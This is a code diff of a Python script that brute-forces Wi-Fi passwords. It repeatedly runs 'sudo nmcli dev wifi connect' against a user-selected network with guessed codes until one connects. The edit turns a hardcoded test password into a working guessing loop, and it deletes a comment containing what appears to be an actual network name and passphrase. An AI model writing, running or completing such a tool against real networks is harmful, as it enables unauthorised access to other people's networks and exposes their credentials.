@@ -33,24 +33,27 @@ def bruteforce(ssid, password=""):
         correct_code = ""
         try:
             for i in range(len(codes)):
-                try:
-                    result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", "38969973"], stdout=subprocess.PIPE)
-                    print(result)
-                    if ("Error:" in result):
-                        print(f"password {i} is incorrect")
-                    else:
-                        correct = True
-                        correct_code = codes[i]
-                        print(f"The password of {ssid} is {correct_code}")
-                        break
-                except:
-                    print("erre")
+                if correct:
+                    break
+                sleep(2)
+                result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", codes[i]], stdout=subprocess.PIPE)
+                print(result)
+                if 'returncode=0' in str(result):
+                    print(f"correct password found: {codes[i]}")
+                    correct_code = codes[i]
+                    correct = True
+                    break
+
+                else:
+                    print("no")
         except:
             print("Error occured in bruteforcing")
         finally:
             print("Ending bruteforce")
             if correct:
                 print(f"The password of {ssid} is {correct_code}")
+            else:
+                print('failed to bruteforce password')
 
 print("STARTED")
 
@@ -60,4 +63,3 @@ for i in range(len(ssid_list)):
     print(f"> {ssid_list[i]} < ({i})")
 selected_network = int(input("Enter number here: "))
 bruteforce(ssid_list[selected_network])
-# nmcli connection add type wifi ifname wlp2s0 ssid H con-name PRATAP2 +802-11-wireless-security.key-mgmt WPA-PSK +802-11-wireless-security.psk 50251919
